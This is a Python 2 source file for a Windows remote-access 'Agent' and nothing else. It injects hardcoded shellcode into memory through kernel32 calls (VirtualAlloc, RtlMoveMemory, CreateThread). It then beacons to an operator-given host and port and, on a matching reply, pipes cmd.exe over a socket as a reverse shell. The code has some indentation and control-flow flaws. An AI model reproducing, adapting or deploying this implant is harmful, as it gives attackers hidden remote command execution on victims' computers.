import socket
import subprocess
import errno
import time
import os
import signal
import sys
import ctypes

class Agent:
    def __init__(self, target, port):
        self.hostname = target
        self.port = int(port)

    def run_worker(self):
	self.shellcode()
        while True:
            try:
                print "[*] Poking server"
                self.poke()
            except Exception,exc:
                  time.sleep(2)
            else:
                print "[*] Hello Server"
        else:
            raise

    def poke(self):
        whoami = ([(checkip.connect(('8.8.8.8', 80)), checkip.getsockname()[0], checkip.close()) for checkip in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1])
        time.sleep(1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.hostname, self.port))
        s.sendall(whoami)
        data = s.recv(1024)
        split = data.split(":")
        if whoami == split[0]:
            print "[*] Connecting"
            sterminal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sterminal.connect((self.hostname, int(split[1])))
            os.dup2(sterminal.fileno(), 0)
            os.dup2(sterminal.fileno(), 1)
            os.dup2(sterminal.fileno(), 2)
            subprocess.call(["cmd /c start cmd.exe", "-i"])
        s.close()

    def shellcode(self):
	print "[*] Executing Shellcode"
	shellcode = bytearray("\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9\xB1\x18\x33\xFF\x33\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x03\xF8\xE2\xF0\x81\xFF\x5B\xBC\x4A\x6A\x8B\x5A\x10\x8B\x12\x75\xDA\x8B\x53\x3C\x03\xD3\xFF\x72\x34\x8B\x52\x78\x03\xD3\x8B\x72\x20\x03\xF3\x33\xC9\x41\xAD\x03\xC3\x81\x38\x47\x65\x74\x50\x75\xF4\x81\x78\x04\x72\x6F\x63\x41\x75\xEB\x81\x78\x08\x64\x64\x72\x65\x75\xE2\x49\x8B\x72\x24\x03\xF3\x66\x8B\x0C\x4E\x8B\x72\x1C\x03\xF3\x8B\x14\x8E\x03\xD3\x52\x68\x78\x65\x63\x01\xFE\x4C\x24\x03\x68\x57\x69\x6E\x45\x54\x53\xFF\xD2\x68\x63\x6D\x64\x01\xFE\x4C\x24\x03\x6A\x05\x33\xC9\x8D\x4C\x24\x04\x51\xFF\xD0\x68\x65\x73\x73\x01\x8B\xDF\xFE\x4C\x24\x03\x68\x50\x72\x6F\x63\x68\x45\x78\x69\x74\x54\xFF\x74\x24\x20\xFF\x54\x24\x20\x57\xFF\xD0")
	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
	buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
	ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
	ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
hostname = sys.argv[1]
port = sys.argv[2]
new = Agent(hostname, port)
new.run_worker()

